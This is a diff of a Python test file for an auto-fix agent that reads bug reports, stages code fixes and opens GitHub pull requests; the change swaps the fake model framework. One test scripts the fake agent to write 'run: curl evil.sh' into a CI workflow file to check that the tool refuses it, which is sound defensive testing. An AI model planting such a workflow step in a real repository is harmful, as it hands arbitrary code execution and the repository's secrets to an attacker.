@@ -2,7 +2,7 @@
 
 Every HTTP call the nodes make is served by an httpx MockTransport that
 records requests, so the assertions are about the *wire*: which endpoints,
-what payloads, in what order. The fix loop's model is a FunctionModel scripted
+what payloads, in what order. The fix loop's model is a scripted fake
 to read, stage a write, and summarise — the loop, tools, staging and PR are
 all the real code. The genuinely-live path is the standing rule in CLAUDE.md:
 provider-touching nodes get their live run before shipping changes.
@@ -17,8 +17,6 @@ import uuid
 import httpx
 import pytest
 from pydantic import ValidationError
-from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart
-from pydantic_ai.models.function import FunctionModel
 
 from basivo_orch.flows.nodes.base import NodeContext, NodeError, ResolvedCredential
 from basivo_orch.flows.nodes.gitops import (
@@ -31,6 +29,7 @@ from basivo_orch.flows.nodes.gitops import (
     TicketNode,
     is_protected,
 )
+from tests.flows.fakes import FakeChatModel, says, tool_call, turn_number
 
 
 class _Recorder:
@@ -193,27 +192,17 @@ def scripted_fix_model():
     """A model that reads the file, stages the fix, and summarises."""
     turn = {"n": 0}
 
-    def model(messages, info):
+    def model(messages):
         turn["n"] += 1
         if turn["n"] == 1:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(tool_name="read_file", args={"path": "calc.py"}, tool_call_id="r1")
-                ]
-            )
+            return tool_call("read_file", {"path": "calc.py"}, call_id="r1")
         if turn["n"] == 2:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
-                        tool_call_id="w1",
-                    )
-                ]
+            return tool_call(
+                "write_file",
+                {"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
+                call_id="w1",
             )
-        return ModelResponse(
-            parts=[TextPart(content="add() subtracted instead of adding; flipped the operator.")]
-        )
+        return says("add() subtracted instead of adding; flipped the operator.")
 
     return model
 
@@ -222,9 +211,9 @@ async def test_autofix_stages_commits_and_opens_the_pr(monkeypatch):
     requests: list[httpx.Request] = []
 
     async def fake_build(ctx, **kwargs):
-        return FunctionModel(scripted_fix_model())
+        return FakeChatModel(respond=scripted_fix_model())
 
-    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)
+    monkeypatch.setattr("basivo_orch.flows.nodes.gitops.build_chat_model", fake_build)
 
     recorder = _Recorder()
     async with httpx.AsyncClient(
@@ -253,9 +242,15 @@ async def test_autofix_stages_commits_and_opens_the_pr(monkeypatch):
         ("POST", "/repos/acme/api/pulls"),
     ]
 
-    # And the step log tells the whole story in order.
-    kinds = [kind for kind, _ in recorder.steps]
+    # And the step log tells the whole story in order. `llm.response` steps are
+    # interleaved — one per model turn, with its own tokens and cost, which the
+    # old single-call loop never recorded — so the fix's own steps are read out
+    # of the sequence rather than compared to it.
+    kinds = [kind for kind, _ in recorder.steps if not kind.startswith("llm.")]
     assert kinds == ["fix.started", "fix.read", "fix.staged", "fix.committed", "pr.opened"]
+    assert any(kind == "llm.response" for kind, _ in recorder.steps), (
+        "the repair loop logged no model turns"
+    )
 
     # The PR body carries the never-merges statement.
     pr_request = json.loads(requests[-1].content)
@@ -263,13 +258,13 @@ async def test_autofix_stages_commits_and_opens_the_pr(monkeypatch):
 
 
 async def test_autofix_fails_loudly_when_the_agent_changes_nothing(monkeypatch):
-    def timid_model(messages, info):
-        return ModelResponse(parts=[TextPart(content="I could not find the cause.")])
+    def timid_model(messages):
+        return says("I could not find the cause.")
 
     async def fake_build(ctx, **kwargs):
-        return FunctionModel(timid_model)
+        return FakeChatModel(respond=timid_model)
 
-    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)
+    monkeypatch.setattr("basivo_orch.flows.nodes.gitops.build_chat_model", fake_build)
 
     requests: list[httpx.Request] = []
     recorder = _Recorder()
@@ -288,36 +283,20 @@ async def test_autofix_fails_loudly_when_the_agent_changes_nothing(monkeypatch):
 
 
 async def test_autofix_write_limit_refuses_sprawling_fixes(monkeypatch):
-    def sprawling_model(messages, info):
+    def sprawling_model(messages):
         # Tries to write a second file; the tool must refuse, and the model's
         # next turn just finishes.
-        turn = len([m for m in messages if m.kind == "response"])
+        turn = turn_number(messages)
         if turn == 0:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": "a.py", "content": "x"},
-                        tool_call_id="w1",
-                    )
-                ]
-            )
+            return tool_call("write_file", {"path": "a.py", "content": "x"}, call_id="w1")
         if turn == 1:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": "b.py", "content": "y"},
-                        tool_call_id="w2",
-                    )
-                ]
-            )
-        return ModelResponse(parts=[TextPart(content="done")])
+            return tool_call("write_file", {"path": "b.py", "content": "y"}, call_id="w2")
+        return says("done")
 
     async def fake_build(ctx, **kwargs):
-        return FunctionModel(sprawling_model)
+        return FakeChatModel(respond=sprawling_model)
 
-    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)
+    monkeypatch.setattr("basivo_orch.flows.nodes.gitops.build_chat_model", fake_build)
 
     requests: list[httpx.Request] = []
     recorder = _Recorder()
@@ -446,34 +425,26 @@ async def test_the_agent_cannot_write_a_workflow_file(monkeypatch):
     is arbitrary code execution with the repository's secrets.
     """
 
-    def ci_editing_model(messages, info):
-        turn = len([m for m in messages if m.kind == "response"])
+    def ci_editing_model(messages):
+        turn = turn_number(messages)
         if turn == 0:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": ".github/workflows/ci.yml", "content": "run: curl evil.sh"},
-                        tool_call_id="w1",
-                    )
-                ]
+            return tool_call(
+                "write_file",
+                {"path": ".github/workflows/ci.yml", "content": "run: curl evil.sh"},
+                call_id="w1",
             )
         if turn == 1:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
-                        tool_call_id="w2",
-                    )
-                ]
+            return tool_call(
+                "write_file",
+                {"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
+                call_id="w2",
             )
-        return ModelResponse(parts=[TextPart(content="fixed calc.py; refused to edit CI")])
+        return says("fixed calc.py; refused to edit CI")
 
     async def fake_build(ctx, **kwargs):
-        return FunctionModel(ci_editing_model)
+        return FakeChatModel(respond=ci_editing_model)
 
-    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)
+    monkeypatch.setattr("basivo_orch.flows.nodes.gitops.build_chat_model", fake_build)
 
     requests: list[httpx.Request] = []
     recorder = _Recorder()
@@ -507,36 +478,32 @@ async def test_the_agent_cannot_write_a_workflow_file(monkeypatch):
 async def test_a_screenshot_in_the_report_reaches_the_model(monkeypatch):
     """The core of "read the picture and fix it": an image referenced in the
     issue body is fetched and handed to the model as image content."""
-    from pydantic_ai.messages import BinaryContent as MsgBinaryContent
-
     png = b"\x89PNG\r\n\x1a\n" + b"0" * 32
     saw_image: list[str] = []
 
-    def looking_model(messages, info):
+    def looking_model(messages):
+        # A LangChain message carries its content directly; a multimodal one is
+        # a list of blocks.
         for message in messages:
-            for part in getattr(message, "parts", []):
-                content = getattr(part, "content", None)
-                if isinstance(content, list):
-                    for item in content:
-                        if isinstance(item, MsgBinaryContent):
-                            saw_image.append(item.media_type)
-        turn = len([m for m in messages if m.kind == "response"])
+            content = getattr(message, "content", None)
+            if isinstance(content, list):
+                for item in content:
+                    if isinstance(item, dict) and item.get("type") == "image_url":
+                        url = item.get("image_url", {}).get("url", "")
+                        saw_image.append(url.split(";")[0].removeprefix("data:"))
+        turn = turn_number(messages)
         if turn == 0:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
-                        tool_call_id="w1",
-                    )
-                ]
+            return tool_call(
+                "write_file",
+                {"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
+                call_id="w1",
             )
-        return ModelResponse(parts=[TextPart(content="The screenshot showed add() returning -1.")])
+        return says("The screenshot showed add() returning -1.")
 
     async def fake_build(ctx, **kwargs):
-        return FunctionModel(looking_model)
+        return FakeChatModel(respond=looking_model)
 
-    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)
+    monkeypatch.setattr("basivo_orch.flows.nodes.gitops.build_chat_model", fake_build)
 
     requests: list[httpx.Request] = []
     repo = github_repo_handler(requests)
@@ -578,24 +545,16 @@ async def test_an_image_on_an_untrusted_host_is_skipped_not_fetched(monkeypatch)
     """A bug report can point anywhere; only allowlisted hosts are fetched,
     and the run says which were skipped rather than failing silently."""
 
-    def quiet_model(messages, info):
-        turn = len([m for m in messages if m.kind == "response"])
+    def quiet_model(messages):
+        turn = turn_number(messages)
         if turn == 0:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": "calc.py", "content": "x = 1\n"},
-                        tool_call_id="w1",
-                    )
-                ]
-            )
-        return ModelResponse(parts=[TextPart(content="done")])
+            return tool_call("write_file", {"path": "calc.py", "content": "x = 1\n"}, call_id="w1")
+        return says("done")
 
     async def fake_build(ctx, **kwargs):
-        return FunctionModel(quiet_model)
+        return FakeChatModel(respond=quiet_model)
 
-    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)
+    monkeypatch.setattr("basivo_orch.flows.nodes.gitops.build_chat_model", fake_build)
 
     requests: list[httpx.Request] = []
     repo = github_repo_handler(requests)
@@ -629,35 +588,36 @@ async def test_a_vision_model_describes_the_picture_for_a_tool_only_model(monkey
     png = b"\x89PNG\r\n\x1a\n" + b"0" * 32
     repair_prompts: list[str] = []
 
-    def vision_model(messages, info):
-        return ModelResponse(parts=[TextPart(content="Tax row reads $0.00; total $29.99.")])
+    def vision_model(messages):
+        return says("Tax row reads $0.00; total $29.99.")
 
-    def repair_model(messages, info):
+    def repair_model(messages):
         for message in messages:
-            for part in getattr(message, "parts", []):
-                content = getattr(part, "content", None)
-                # A multi-part prompt arrives as a list; a plain one as a str.
-                if isinstance(content, str):
-                    repair_prompts.append(content)
-                elif isinstance(content, list):
-                    repair_prompts.extend(c for c in content if isinstance(c, str))
-        turn = len([m for m in messages if m.kind == "response"])
+            content = getattr(message, "content", None)
+            # A multi-part prompt arrives as a list of blocks; a plain one as a str.
+            if isinstance(content, str):
+                repair_prompts.append(content)
+            elif isinstance(content, list):
+                repair_prompts.extend(
+                    block.get("text", "")
+                    for block in content
+                    if isinstance(block, dict) and block.get("type") == "text"
+                )
+        turn = turn_number(messages)
         if turn == 0:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
-                        tool_call_id="w1",
-                    )
-                ]
+            return tool_call(
+                "write_file",
+                {"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
+                call_id="w1",
             )
-        return ModelResponse(parts=[TextPart(content="Added the missing tax.")])
+        return says("Added the missing tax.")
 
-    async def fake_build(ctx, *, provider, model, credential_id, base_url=""):
-        return FunctionModel(vision_model if model == "sees-only" else repair_model)
+    async def fake_build(ctx, **kwargs):
+        return FakeChatModel(
+            respond=vision_model if kwargs.get("model") == "sees-only" else repair_model
+        )
 
-    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)
+    monkeypatch.setattr("basivo_orch.flows.nodes.gitops.build_chat_model", fake_build)
 
     requests: list[httpx.Request] = []
     repo = github_repo_handler(requests)
@@ -690,31 +650,23 @@ async def test_a_vision_model_describes_the_picture_for_a_tool_only_model(monkey
 
 
 async def test_a_blind_run_beats_a_failed_one_when_the_vision_model_errors(monkeypatch):
-    from pydantic_ai import UnexpectedModelBehavior
-
     png = b"\x89PNG\r\n\x1a\n" + b"0" * 32
 
-    def broken_vision(messages, info):
-        raise UnexpectedModelBehavior("vision endpoint is down")
+    def broken_vision(messages):
+        raise RuntimeError("vision endpoint is down")
 
-    def repair_model(messages, info):
-        turn = len([m for m in messages if m.kind == "response"])
+    def repair_model(messages):
+        turn = turn_number(messages)
         if turn == 0:
-            return ModelResponse(
-                parts=[
-                    ToolCallPart(
-                        tool_name="write_file",
-                        args={"path": "calc.py", "content": "x\n"},
-                        tool_call_id="w1",
-                    )
-                ]
-            )
-        return ModelResponse(parts=[TextPart(content="Fixed from the text alone.")])
+            return tool_call("write_file", {"path": "calc.py", "content": "x\n"}, call_id="w1")
+        return says("Fixed from the text alone.")
 
-    async def fake_build(ctx, *, provider, model, credential_id, base_url=""):
-        return FunctionModel(broken_vision if model == "sees-only" else repair_model)
+    async def fake_build(ctx, **kwargs):
+        return FakeChatModel(
+            respond=broken_vision if kwargs.get("model") == "sees-only" else repair_model
+        )
 
-    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)
+    monkeypatch.setattr("basivo_orch.flows.nodes.gitops.build_chat_model", fake_build)
 
     requests: list[httpx.Request] = []
     repo = github_repo_handler(requests)
@@ -737,7 +689,9 @@ async def test_a_blind_run_beats_a_failed_one_when_the_vision_model_errors(monke
             ctx,
         )
 
-    assert result.output["pr_url"].endswith("/pull/42"), "the run failed because a picture did not load"
+    assert result.output["pr_url"].endswith("/pull/42"), (
+        "the run failed because a picture did not load"
+    )
     assert any(kind == "fix.image_unread" for kind, _ in recorder.steps)
 
 
